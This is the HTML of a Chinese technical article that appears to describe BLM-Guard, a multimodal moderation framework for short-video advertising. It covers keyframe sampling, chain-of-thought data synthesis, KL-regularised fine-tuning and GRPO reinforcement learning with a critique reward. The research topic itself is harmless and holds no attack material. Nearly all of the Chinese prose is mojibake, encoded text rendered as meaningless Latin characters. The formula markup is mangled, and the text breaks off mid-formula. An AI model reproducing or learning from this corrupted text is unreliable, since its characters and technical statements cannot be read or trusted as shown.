<p>ä¸ä¼ ç»Ÿçš„æ˜¾æ€§é£é™©ä¸åŒï¼Œå•†ä¸šå¹¿å‘Šçš„è¿è§„å¾€å¾€éšè—åœ¨è·¨æ¨¡æ€çš„é”™ä½ä¸­â€”â€”ç”»é¢åˆè§„ä½†å£æ’­è¿è§„ã€å­—å¹•åˆè§„ä½†æš—ç¤ºæ€§æå¼ºã€‚è¿™ç±»â€œé«˜é£é™©ã€å¼ºå¯¹æŠ—â€çš„å†…å®¹ï¼Œå¯¹å®¡æ ¸ç³»ç»Ÿæå‡ºäº†æé«˜çš„è¦æ±‚ï¼šä¸ä»…è¦åˆ¤å¾—å‡†ï¼ˆå‡†ç¡®æ€§ï¼‰ï¼Œè¿˜è¦è¯´å¾—æ¸…ï¼ˆå¯è§£é‡Šæ€§ï¼‰ï¼Œæ›´è¦è·Ÿå¾—ä¸Šæ”¿ç­–çš„å¿«é€Ÿè¿­ä»£ï¼ˆæ”¿ç­–å¯¹é½ï¼‰ã€‚é¢å¯¹è¿™ä¸€æŒ‘æˆ˜ï¼Œä¼ ç»Ÿçš„â€œé»‘ç›’â€åˆ¤åˆ«æ¨¡å‹æˆ–é€šç”¨å¤šæ¨¡æ€å¤§æ¨¡å‹ï¼ˆVLMï¼‰å¾€å¾€åŠ›ä¸ä»å¿ƒï¼šå‰è€…ç¼ºä¹å› æœæ¨ç†èƒ½åŠ›ï¼Œåè€…éš¾ä»¥é€‚åº”ç»†ç²’åº¦çš„å•†ä¸šå®¡æ ¸ç­–ç•¥ã€‚</p>
<p>ä¸ºè§£å†³è¿™ä¸€ç—›ç‚¹ï¼Œå¿«æ‰‹å•†ä¸šç”Ÿæ€ä¸ä½“éªŒç®—æ³•å›¢é˜Ÿæå‡ºäº† BLM-Guardï¼Œè¿™æ˜¯ä¸€ä¸ªä¸“ä¸ºé«˜é£é™©çŸ­è§†é¢‘å¹¿å‘Šè®¾è®¡çš„å¯è§£é‡Šæ€§å¤šæ¨¡æ€å®¡æ ¸æ¡†æ¶ã€‚è¯¥æ¡†æ¶èåˆäº†å¤šæ¨¡æ€æ€ç»´é“¾ï¼ˆCoTï¼‰æ¨ç†ä¸ç­–ç•¥å¯¹é½çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLï¼‰ï¼Œé€šè¿‡æ¨¡æ‹Ÿäººç±»å®¡æ ¸å‘˜çš„â€œè§‚å¯Ÿ-å½’å› -åˆ¤æ–­â€é€»è¾‘ï¼Œæå‡äº†æ¨¡å‹åœ¨å•†ä¸šåŒ–åœºæ™¯ä¸‹çš„å®¡æ ¸ç²¾åº¦ä¸æ¨ç†ä¸€è‡´æ€§ã€‚</p>
<p>æœ¬ç ”ç©¶ç›¸å…³æˆæœã€ŠBLM-Guard: Explainable Multimodal Ad Moderation with Chain-of-Thought and Policy-Aligned Rewardsã€‹å·²è¢«äººå·¥æ™ºèƒ½é¡¶çº§ä¼šè®® AAAI 2026ï¼ˆMain Trackï¼‰ æ¥æ”¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b31b113da8b345b096cc59f5dae20d35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=qIN8aKWHtQ8pYge%2Byf2Vl4OoQP8%3D" alt="" loading="lazy"/></p>
<p>å›¾ 2 BLM-Guard ä¸¤é˜¶æ®µè®­ç»ƒæ¡†æ¶ç¤ºæ„å›¾</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹ï¼š</strong></p>
<ul>
<li>ã€åƒå®¡æ ¸å‘˜ä¸€æ ·æ€è€ƒã€‘ é’ˆå¯¹çŸ­è§†é¢‘å¹¿å‘Šè¿è§„éšè”½æ€§å¼ºçš„é—®é¢˜ï¼Œæœ¬æ–‡æå‡º ICoTï¼ˆInterleaved-modal Chain-of-Thoughtï¼‰ æµæ°´çº¿ã€‚é€šè¿‡è§„åˆ™é©±åŠ¨çš„æ•°æ®åˆæˆï¼Œç”ŸæˆåŒ…å«â€œè§†è§‰å®šä½-é£é™©ç­›æŸ¥-å› æœåˆ†æ-æœ€ç»ˆåˆ¤å†³â€çš„ç»“æ„åŒ–æ¨ç†é“¾ï¼Œè§£å†³æ¨¡å‹â€œåªçŸ¥å…¶ä¸€ä¸çŸ¥å…¶äºŒâ€çš„é»‘ç›’é—®é¢˜ã€‚</li>
<li>ã€åŠ¨æ€ç­–ç•¥è‡ªé€‚åº”ã€‘ é¢å¯¹ä¸æ–­å˜åŒ–çš„å®¡æ ¸è§„åˆ™ï¼Œåˆ›æ–°æ€§æå‡º SCA-Rï¼ˆSelf-Adaptive Critique Rewardï¼‰ å¥–åŠ±æœºåˆ¶ã€‚åŸºäºåŠ¨æ€åŸåˆ™å¯¹æ¨¡å‹çš„æ¨ç†è¿‡ç¨‹è¿›è¡Œæ‰“åˆ†ï¼Œç»“åˆ GRPO å¼ºåŒ–å­¦ä¹ ç®—æ³•ï¼Œç¡®ä¿æ¨¡å‹åœ¨ç­–ç•¥æ¼‚ç§»ä¸‹ä»èƒ½ä¿æŒé«˜ä¸€è‡´æ€§ã€‚</li>
<li>ã€é¦–ä¸ªå¤šæ¨¡æ€å¹¿å‘Šé£æ§åŸºå‡†ã€‘ å‘å¸ƒäº† BLM-Guard Benchmarkï¼Œè¿™æ˜¯ä¸šç•Œé¦–ä¸ªåŒ…å«ä¸‰çº§é£é™©åˆ†ç±»ä½“ç³»ï¼ˆé£é™©åœºæ™¯ã€è¿è§„ç±»å‹ã€ä¸¥é‡ç¨‹åº¦ï¼‰çš„çŸ­è§†é¢‘å¹¿å‘Šæ•°æ®é›†ï¼Œæ¶µç›–éæ³•å†…å®¹ã€è™šå‡è¥é”€ã€è¯¯å¯¼æ€§æ“ä½œç­‰ä¸ƒå¤§æ ¸å¿ƒåœºæ™¯ï¼Œå¡«è¡¥äº†ç²¾ç»†åŒ–å¹¿å‘Šå®¡æ ¸è¯„æµ‹çš„ç©ºç™½ã€‚</li>
</ul>
<h2 data-id="heading-0">ä¸€ã€ç ”ç©¶èƒŒæ™¯</h2>
<p>éšç€çŸ­è§†é¢‘å•†ä¸šåŒ–æ·±å…¥ï¼Œå¹¿å‘Šå·²æˆä¸ºå¹³å°æ ¸å¿ƒæ”¯æŸ±ï¼Œä½†è¿è§„å†…å®¹æ—¥ç›Šå‘ˆç°â€œéšè”½åŒ–ã€ååŒåŒ–ã€å¯¹æŠ—åŒ–â€è¶‹åŠ¿ã€‚è¿™ç§é«˜é£é™©ã€å¼ºå¯¹æŠ—çš„ä¸šæ€å¯¹ç°æœ‰çš„å®¡æ ¸ä½“ç³»æå‡ºäº†ä¸¥å³»æŒ‘æˆ˜ï¼Œä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹ä¸‰ä¸ªç»´åº¦ï¼š</p>
<ol>
<li>è¿è§„å½¢æ€æ¼”å˜</li>
</ol>
<p>å¤šæ¨¡æ€ååŒæ¬ºéª—ç”Ÿæˆå¼ AI çš„æ™®åŠä½¿å¾—è¿è§„æ‰‹æ®µä»å•ä¸€çš„æ˜¾æ€§è¿è§„ï¼ˆå¦‚æ•æ„Ÿè¯ã€è¿è§„ç”»é¢ï¼‰å‡çº§ä¸ºâ€œå¤šæ¨¡æ€ååŒæ¬ºéª—â€ã€‚è¿™ç±»å†…å®¹é€šå¸¸å•æ¨¡æ€çœ‹ä¼¼åˆè§„ï¼Œä½†é€šè¿‡è·¨æ¨¡æ€çš„ä¿¡æ¯é”™ä½ï¼ˆå¦‚ç”»é¢æ­£å¸¸ä½†å£æ’­è¿è§„ï¼‰ä¼ é€’æ¶æ„æ„å›¾ï¼Œæå¤§åœ°å¢åŠ äº†è¯†åˆ«éš¾åº¦ã€‚</p>
<ol start="2">
<li>å®¡æ ¸æ ‡å‡†å›°å¢ƒ</li>
</ol>
<p>åŠ¨æ€æ€§ä¸å¤æ‚æ€§çš„å¤šé‡çŸ›ç›¾å•†ä¸šå¹¿å‘Šå®¡æ ¸é¢ä¸´æ”¿ç­–ã€åœºæ™¯ä¸é£é™©çš„ä¸‰é‡å¤æ‚æ€§ï¼š</p>
<ul>
<li>
<p>æ”¿ç­–æ¼‚ç§»ä¸è§„åˆ™é€‚é…ï¼š æ³•è§„ï¼ˆå¦‚ã€Šå¹¿å‘Šæ³•ã€‹ï¼‰ä¸å¹³å°è§„èŒƒçš„åŠ¨æ€æ›´æ–°ï¼Œå¯¼è‡´é™æ€æ¨¡å‹éš¾ä»¥é€‚åº”ä¸æ–­æ¼‚ç§»çš„æ”¿ç­–è¾¹ç•Œã€‚</p>
</li>
<li>
<p>åœºæ™¯å·®å¼‚ä¸é€šç”¨æ€§ï¼š åŒ»ç–—ã€é‡‘èã€æ•™è‚²ç­‰ä¸åŒè¡Œä¸šå®¡æ ¸é€»è¾‘è¿¥å¼‚ï¼Œé€šç”¨æ¨¡å‹éš¾ä»¥å…¼é¡¾ç»†ç²’åº¦çš„é¢†åŸŸè§„åˆ™ã€‚</p>
</li>
<li>
<p>é£é™©åˆ†å±‚ä¸äºŒå…ƒåˆ¤å†³ï¼š ç°æœ‰æ¨¡å‹å¤šä¸ºâ€œé€šè¿‡/æ‹¦æˆªâ€çš„äºŒå…ƒåˆ¤å†³ï¼Œæ— æ³•åŒºåˆ†é«˜é£é™©ï¼ˆéæ³•ï¼‰ã€ä¸­é£é™©ï¼ˆè¯¯å¯¼ï¼‰ä¸ä½é£é™©ï¼ˆä½“éªŒï¼‰å†…å®¹ï¼Œéš¾ä»¥æ»¡è¶³ç²¾ç»†åŒ–è¿è¥éœ€æ±‚ã€‚</p>
</li>
</ul>
<ol start="3">
<li>è¡Œä¸šè½åœ°è¯‰æ±‚</li>
</ol>
<p>ä»â€œé»‘ç›’â€åˆ°å…¨é“¾è·¯å¯è§£é‡Šå®¡æ ¸ä¸ä»…æ˜¯æŠ€æœ¯åˆ¤åˆ«ï¼Œæ›´éœ€æœåŠ¡äºå¹³å°ç›‘ç®¡ã€å•†å®¶æ•´æ”¹ä¸åˆè§„è¿½æº¯çš„å…¨é“¾è·¯ã€‚ä¼ ç»Ÿè§„åˆ™æ¨¡å‹æ³›åŒ–å·®ï¼Œé€šç”¨å¤§æ¨¡å‹ï¼ˆVLMï¼‰è™½æœ‰ç†è§£åŠ›ä½†å†³ç­–è¿‡ç¨‹å¦‚â€œé»‘ç›’â€ï¼Œç¼ºä¹ç»“æ„åŒ–çš„å½’å› é€»è¾‘ã€‚å•†å®¶æ— æ³•è·çŸ¥å…·ä½“è¿è§„ç‚¹ï¼Œç›‘ç®¡éš¾ä»¥è¿½æº¯è¯æ®é“¾ï¼Œä¸”è¡Œä¸šç¼ºä¹é’ˆå¯¹å¤šæ¨¡æ€ååŒè¿è§„çš„é«˜è´¨é‡æ•°æ®é›†ã€‚</p>
<p>é¢å¯¹ä¸Šè¿°â€œè¿è§„è¯†åˆ«éš¾ã€è§„åˆ™é€‚é…éš¾ã€ç»“æœè½åœ°éš¾â€çš„å›°å¢ƒï¼Œæœ¬ç ”ç©¶æå‡º BLM-Guard æ¡†æ¶ã€‚é€šè¿‡å¼•å…¥æ¨¡æ‹Ÿäººç±»å®¡æ ¸é€»è¾‘çš„â€œå¤šæ¨¡æ€æ€ç»´é“¾ï¼ˆCoTï¼‰â€ä¸ç­–ç•¥å¯¹é½çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLï¼‰ï¼Œæ—¨åœ¨å®ç°å¯¹éšè”½è¿è§„çš„ç²¾å‡†è¯†åˆ«ä¸åŠ¨æ€æ”¿ç­–é€‚é…ï¼Œå¹¶æ„å»ºä¸šç•Œé¦–ä¸ªç²¾ç»†åŒ–å¤šæ¨¡æ€å¹¿å‘Šé£æ§åŸºå‡†ï¼Œä¸ºçŸ­è§†é¢‘å•†ä¸šç”Ÿæ€çš„å®‰å…¨ä¸å¯æŒç»­å‘å±•æä¾›æŠ€æœ¯æ”¯æ’‘ã€‚</p>
<h2 data-id="heading-1">äºŒã€æŠ€æœ¯æ–¹æ¡ˆ</h2>
<p>BLM-Guard é‡‡ç”¨äº†ä¸€ç§æ¸è¿›å¼çš„â€œä¸¤é˜¶æ®µâ€è®­ç»ƒèŒƒå¼ï¼Œåˆ†åˆ«æ˜¯ç¬¬ä¸€é˜¶æ®µä¸­è§„åˆ™é”šå®šçš„ ICoT å†·å¯åŠ¨ï¼ˆRule-Anchored SFTï¼‰å’Œç¬¬äºŒé˜¶æ®µä¸­åŸºäº SCA-R çš„å¼ºåŒ–å­¦ä¹ ï¼ˆSelf-Consistency RLï¼‰ï¼Œç¡®ä¿æ¨¡å‹æ—¢èƒ½å­¦åˆ°è§„åˆ™ï¼Œåˆèƒ½çµæ´»åº”ç”¨ã€‚</p>
<h3 data-id="heading-2">2.1 ç¬¬ä¸€é˜¶æ®µï¼šè§„åˆ™é”šå®šçš„ ICoT å†·å¯åŠ¨</h3>
<p>è¿™ä¸€é˜¶æ®µçš„ç›®æ ‡ä¸æ˜¯ç®€å•åœ°å¾®è°ƒ VLMï¼Œè€Œæ˜¯è§£å†³â€œé»‘ç›’æ¨¡å‹æ— æ³•ç†è§£ç»†ç²’åº¦å•†ä¸šè§„åˆ™â€çš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-3">2.1.1 æ•°æ®æ„é€ â€”â€”è‡ªé€‚åº”å…³é”®å¸§ä¸ ICoT ç”Ÿæˆ</h4>
<p>ä¸ºäº†è®©æ¨¡å‹â€œçœ‹æ‡‚â€è¿è§„ç»†èŠ‚ï¼Œé‡‡ç”¨äº†ä¸€å¥—æ–°çš„æå–æµç¨‹ ï¼š</p>
<ol>
<li>è‡ªé€‚åº”å…³é”®å¸§é‡‡æ · (AKS):</li>
</ol>
<ul>
<li>
<p>CLIP ç›¸ä¼¼åº¦ç­›é€‰ï¼š è®¡ç®—æ¯ä¸€å¸§å›¾åƒåµŒå…¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ä¸é¢„å®šä¹‰é£é™©æç¤ºè¯ï¼ˆå¦‚"false marketing", "illegal content"ï¼‰åµŒå…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">t_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>çš„ä½™å¼¦ç›¸ä¼¼åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mtext>â€‹</mtext><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mi>k</mi><mtext>â€‹</mtext><mo stretchy="false">(</mo><mi>v</mi><mi>i</mi><mi>T</mi><mtext>â€‹</mtext><mi>t</mi><mi>k</mi><mtext>â€‹</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">siâ€‹=maxkâ€‹(viTâ€‹tkâ€‹)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">â€‹</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord">â€‹</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">â€‹</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
</li>
<li>
<p>BIN+TOP ç­–ç•¥ï¼š å°†è§†é¢‘åˆ’åˆ†ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>ä¸ªæ—¶é—´æ¡¶ï¼ˆBINï¼‰é€‰å±€éƒ¨æœ€ä¼˜ï¼Œè‹¥ä¸è¶³åˆ™è¡¥å……å…¨å±€æœ€é«˜åˆ†å¸§ï¼Œç¡®ä¿æ—¢æœ‰æ—¶é—´è¦†ç›–åˆæœ‰è¯­ä¹‰æ˜¾è‘—æ€§ ã€‚</p>
</li>
</ul>
<p>2.Patch çº§åŒºåŸŸå®šä½ï¼š ä½¿ç”¨ InternViT-6B æå– Patch ç‰¹å¾ï¼Œè®¡ç®— L2 èŒƒæ•°ä½œä¸ºæ˜¾è‘—æ€§åˆ†æ•°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>i</mi><mo separator="true">,</mo><mi>p</mi><mtext>â€‹</mtext><mo>=</mo><mo>âˆ£</mo><mo>âˆ£</mo><mi>H</mi><mi>i</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>â€‹</mtext><mo>âˆ£</mo><mo>âˆ£</mo><mn>2</mn><mtext>â€‹</mtext></mrow><annotation encoding="application/x-tex">scorei,pâ€‹=âˆ£âˆ£Hi(p)â€‹âˆ£âˆ£2â€‹</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">score</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">p</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=âˆ£âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2â€‹</span></span></span></span></span>ï¼Œå®šä½å‡ºå…³é”®å›¾åƒåŒºåŸŸï¼ˆå¦‚å­—å¹•ã€äº§å“ç‰¹å†™ï¼‰ ã€‚</p>
<ol start="3">
<li>ICoTï¼ˆäº¤é”™æ¨¡æ€æ€ç»´é“¾ï¼‰ç”Ÿæˆï¼šåˆ©ç”¨å†»ç»“çš„ InternVL-3-78B ä½œä¸ºæ•™å¸ˆæ¨¡å‹ï¼Œç”Ÿæˆç»“æ„åŒ–çš„æ¨ç†é“¾ï¼š</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dc9dc75c67a4bae95edd67f5cce9180~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=gm%2BJH0Q62JddgH4pX1eU%2Fm5a%2BoY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">2.1.2 è®­ç»ƒç›®æ ‡â€”â€”å¼•å…¥è§„åˆ™å…ˆéªŒ</h4>
<p>åœ¨ SFT é˜¶æ®µï¼ŒBLM-Guard ä¿®æ”¹äº†æ ‡å‡†çš„ Cross-Entropy æŸå¤±ï¼ŒåŠ å…¥äº† KL æ•£åº¦çº¦æŸ ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21871f7d381f4728ba1aedafb8202fe6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=Rot%2B%2F%2BatsLjRjIBCs8KfCNVg8SA%3D" alt="" loading="lazy"/></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi>E</mi><mtext>â€‹</mtext></mrow><annotation encoding="application/x-tex">LCEâ€‹</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">CE</span><span class="mord">â€‹</span></span></span></span></span>: ä¿è¯æœ€ç»ˆåˆ¤ç½šï¼ˆAnswerï¼‰çš„å‡†ç¡®æ€§ ã€‚</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>L</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>k</mi><mtext>â€‹</mtext><mo>âˆ£</mo><mo>âˆ£</mo><mi>p</mi><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mtext>â€‹</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">KL(pthinkâ€‹âˆ£âˆ£pruleâ€‹)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mord mathnormal" style="margin-right:0.03148em;">hink</span><span class="mord">â€‹</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">â€‹</span><span class="mclose">)</span></span></span></span></span>: è¿™æ˜¯ä¸€ä¸ªå…³é”®è®¾è®¡ã€‚pruleâ€‹æ˜¯åŸºäºè¿è§„åœºæ™¯å…³é”®è¯æ„å»ºçš„è½¯åˆ†å¸ƒã€‚è¯¥é¡¹å¼ºåˆ¶æ¨¡å‹çš„æ¨ç†è¿‡ç¨‹ä¸­çš„ token åˆ†å¸ƒå‘è¿™äº›è§„åˆ™å…³é”®è¯é æ‹¢ï¼Œé˜²æ­¢æ¨¡å‹æ¨ç†â€œè·‘åâ€æˆ–äº§ç”Ÿå¹»è§‰ ã€‚</li>
</ul>
<h3 data-id="heading-5">2.2 ç¬¬äºŒé˜¶æ®µï¼šåŸºäº SCA-R çš„å¼ºåŒ–å­¦ä¹ </h3>
<p>SFT æ¨¡å‹è™½ç„¶å…·å¤‡äº†åˆæ­¥æ¨ç†èƒ½åŠ›ï¼Œä½†åœ¨é¢å¯¹ç”±äºæ”¿ç­–å¿«é€Ÿè¿­ä»£å¯¼è‡´çš„â€œç­–ç•¥æ¼‚ç§»â€æ—¶ï¼Œæ³›åŒ–æ€§ä¸è¶³ã€‚è¯¥é˜¶æ®µå¼•å…¥äº† GRPOï¼ˆGroup-wise Relative Policy Optimizationï¼‰ç®—æ³•è¿›è¡Œä¼˜åŒ–ã€‚å…¶ä¸­ï¼Œæ··åˆå¥–åŠ±å‡½æ•°è®¾è®¡å¦‚ä¸‹ï¼š</p>
<p>ä¸ºäº†å¹³è¡¡å‡†ç¡®æ€§ã€æ ¼å¼è§„èŒƒå’Œé€»è¾‘ä¸€è‡´æ€§ï¼Œå¥–åŠ±å‡½æ•°ç”±ä¸‰éƒ¨åˆ†ç»„æˆ ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fab3dd93ecb48ed98d8ba887651a1d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=FZm3Tg4CywP3Gk03P7WoH%2F7ohuI%3D" alt="" loading="lazy"/></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">rrule</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span></span></span></span></span>â€‹(è§„åˆ™æ­£ç¡®æ€§): ç¦»æ•£å¥–åŠ±ã€‚å¦‚æœåœºæ™¯å’Œè¿è§„ç±»å‹å…¨å¯¹ç»™ 1.0ï¼Œä»…åœºæ™¯å¯¹ç»™ 0.5ï¼Œå¦åˆ™ä¸º 0 ã€‚</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">rformat</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">t</span></span></span></span></span>â€‹(ç»“æ„çº¦æŸ)ï¼šå¼ºçº¦æŸå¥–åŠ±ï¼Œç¡®ä¿è¾“å‡ºä¸¥æ ¼åŒ…å«å’Œæ ‡ç­¾ï¼Œä¾¿äºåç»­è§£æ ã€‚</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>s</mi><mi>c</mi><mi>a</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">rscaR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">rsc</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></span>â€‹(SCA-R: è‡ªé€‚åº”æ‰¹åˆ¤å¥–åŠ±):</li>
</ul>
<p>åŠ¨æ€ Critique: å¼•å…¥ä¸€ä¸ª Guide Modelï¼ˆ GPT-4oï¼‰ï¼Œå®ƒä¸ä¾èµ–é™æ€æ ‡ç­¾ï¼Œè€Œæ˜¯ æ ¹æ®å½“å‰çš„å®¡æ ¸ Policy å’Œè¾“å…¥ï¼ŒåŠ¨æ€æ„å»ºè¯„åˆ†åŸåˆ™ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mrow><mi>p</mi><mi>k</mi><mtext>â€‹</mtext></mrow></mrow><annotation encoding="application/x-tex">P={pkâ€‹}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span 